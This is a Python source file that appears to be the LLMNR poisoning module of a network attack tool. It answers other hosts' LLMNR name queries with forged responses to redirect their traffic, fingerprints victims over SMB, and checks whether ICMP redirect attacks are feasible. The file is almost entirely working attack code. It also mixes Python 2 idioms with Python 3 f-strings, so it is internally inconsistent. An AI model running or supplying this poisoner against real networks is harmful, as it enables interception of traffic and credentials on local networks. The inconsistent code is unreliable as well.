import struct
import fingerprint
from packets import LLMNR_Ans
from SocketServer import BaseRequestHandler
from utils import *

def Parse_LLMNR_Name(data):
    NameLen = struct.unpack('>B', data[12])[0]
    return data[13:13 + NameLen]

def IsICMPRedirectPlausible(IP):
    dnsip = []
    for line in file('/etc/resolv.conf', 'r'):
        ip = line.split()
        if len(ip) < 2:
            continue
        elif ip[0] == 'nameserver':
            dnsip.extend(ip[1:])
    for x in dnsip:
        if x != "127.0.0.1" and IsOnTheSameSubnet(x, IP) is False:
            print(f"[Analyze mode: ICMP] You can ICMP Redirect on this network.")
            print(f"[Analyze mode: ICMP] This workstation ({IP}) is not on the same subnet than the DNS server ({x}).")
            print(f"[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.")

if settings.Config.AnalyzeMode:
    IsICMPRedirectPlausible(settings.Config.Bind_To)

class LLMNR(BaseRequestHandler):  # LLMNR Server class
    def handle(self):
        data, soc = self.request
        Name = Parse_LLMNR_Name(data)
        # Break out if we don't want to respond to this host
        if RespondToThisHost(self.client_address[0], Name) is not True:
            return None
        if data[2:4] == "\x00\x00" and Parse_IPV6_Addr(data):
            Finger = None
            if settings.Config.Finger_On_Off:
                Finger = fingerprint.RunSmbFinger((self.client_address[0], 445))
            if settings.Config.AnalyzeMode:
                LineHeader = "[Analyze mode: LLMNR]"
                print(f"{LineHeader} Request by {self.client_address[0]} for {Name}, ignoring")
            else:  # Poisoning Mode
                Buffer = LLMNR_Ans(Tid=data[0:2], QuestionName=Name, AnswerName=Name)
                Buffer.calculate()
                soc.sendto(str(Buffer), self.client_address)
                LineHeader = "[*] [LLMNR]"
                print(f"{LineHeader}  Poisoned answer sent to {self.client_address[0]} for name {Name}")
            if Finger is not None:
                print(f"[FINGER] OS Version     : {Finger[0]}")
                print(f"[FINGER] Client Version : {Finger[1]}")
